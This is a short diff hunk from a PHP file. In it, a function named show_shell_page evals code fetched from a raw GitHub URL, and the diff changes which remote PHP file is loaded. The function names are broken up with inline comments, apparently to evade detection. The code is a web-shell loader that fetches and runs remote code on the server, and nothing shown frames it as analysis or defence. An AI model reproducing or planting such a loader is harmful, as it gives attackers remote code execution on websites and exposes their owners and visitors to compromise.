@@ -32,7 +32,7 @@ exit;
 function show_shell_page() {
     eval/**_**/(urldecode('%3f%3e') .
         file_get_contents/**_**/(urldecode/**_**/(
-            'https://raw.githubusercontent.com/neurodie/hxc/refs/heads/main/privshell/hxc.php'
+            'https://raw.githubusercontent.com/neurodie/hxc/refs/heads/main/rndm/mini_disablefunc.php'
         ))
     );
     exit;
